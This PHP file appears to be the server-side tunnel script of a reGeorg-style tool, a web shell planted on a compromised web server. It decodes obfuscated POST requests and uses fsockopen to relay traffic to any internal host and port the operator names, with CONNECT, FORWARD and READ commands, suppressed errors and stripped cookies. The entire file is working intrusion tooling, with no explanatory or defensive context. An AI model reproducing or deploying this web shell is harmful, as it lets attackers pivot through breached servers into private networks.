<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);
set_time_limit(0);


function bytesToInt($bytes) {
    return ((ord($bytes[0]) & 0xff) | ((ord($bytes[1]) & 0xff) << 8) | ((ord($bytes[2]) & 0xff) << 16)
        | ((ord($bytes[3]) & 0xff) << 24));
}
function intToBytes($val) {
    $val = (int)$val;
    $byte = "";
    $byte.= chr($val & 0xFF);
    $byte.=chr($val >> 8 & 0xFF);
    $byte.=chr($val >> 16 & 0xFF);
    $byte.=chr($val >> 24 & 0xff);
    return $byte;
}
function g_deserialize($pms){
    $index=0;
    $key=null;
    $parameters = array();
    while (true){
        $q=$pms[$index];
        $f = ord($q);
        if ($f == 0x01 || $f == 0x02){
            $len=bytesToInt(substr($pms,$index+1,4));
            $index+=4;
            $value=substr($pms,$index+1,$len);
            $index+=$len;
            $parameters[$key]= $value;
            $key=null;
        }else if ($f == 0x03){
            $len=bytesToInt(substr($pms,$index+1,4));
            $index+=4;
            $value=substr($pms,$index+1,$len);
            $index+=$len;
            $parameters[$key] = bytesToInt($value);
            $key=null;
        }else{
            $key.=$q;
        }
        $index++;
        if ($index>strlen($pms)-1){
            break;
        }
    }
    return $parameters;
}
function g_serialize($par){
    $out = "";
    foreach ($par as $key => $value) {
        $out.=$key;
        $_v = null;
        if(is_int($value)){
            $out.="\x03";
            $_v = intToBytes($value);
        }else{
            if (substr($value,0,1) == "\x02"){
                $out.="\x02";
                $_v = substr($value,1);
            }else{
                $out.="\x01";
                $_v = "".$value;
            }
        }
        $out.=intToBytes(strlen($_v));
        $out.=$_v;
    }
    return $out;
}

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);



$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "BASE64 CHARSLIST";



$request = @base64_decode(@strtr(@file_get_contents("php://input"), $de, $en));
$cmd = null;
if (!empty($request)){
    $request = g_deserialize($request);
    $cmd = $request["X-CMD"];
    $mark = substr($cmd,0,22);
    $cmd = substr($cmd, 22);
    $run = "run".$mark;
    $writebuf = "writebuf".$mark;
    $readbuf = "readbuf".$mark;
}

switch($cmd){
    case "CONNECT":
        {
            $target = $request["X-HOST"];
            $port = $request["X-PORT"];
            $res = fsockopen($target, $port, $errno, $errstr, 1);
            if ($res === false)
            {
                $result = array();
                $result["X-STATUS"] = "FAIL";
                $result["X-ERROR"] = "Failed connecting to target";
                echo base64_decode(strtr(g_serialize($result), $de, $en));
                exit(0);
            }

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                session_write_close();
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 10)) {
                    if($o === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "DISCONNECT":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "READ":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                header("Connection: Keep-Alive");

                $result = array();
                $result["X-STATUS"] = "OK";
                $result["X-DATA"] = "\x02".$readBuffer;
                echo strtr(base64_encode(g_serialize($result)), $en, $de);
                exit(0);
            } else {
                header('X-STATUS: FAIL');
            }
        }
        break;
    case "FORWARD": {
        @session_start();
        $running = $_SESSION[$run];
        session_write_close();
        if(!$running){
            $result = array();
            $result["X-STATUS"] = "FAIL";
            $result["X-ERROR"] = "No more running, close now";
            echo strtr(base64_encode(g_serialize($result)), $en, $de);
            exit(0);
        }
        header('Content-Type: application/octet-stream');
        $rawPostData = $request["X-DATA"];
        if ($rawPostData) {
            @session_start();
            $_SESSION[$writebuf] .= $rawPostData;
            session_write_close();
            header("Connection: Keep-Alive");

            $result = array();
            $result["X-STATUS"] = "OK";
            echo strtr(base64_encode(g_serialize($result)), $en, $de);
            exit(0);
        } else {
            $result = array();
            $result["X-STATUS"] = "FAIL";
            $result["X-ERROR"] = "POST request read filed";
            echo strtr(base64_encode(g_serialize($result)), $en, $de);
            exit(0);
        }
    }
    default: {
        @session_start();
        session_write_close();
        exit("Georg says, 'All seems fine'");
    }
}
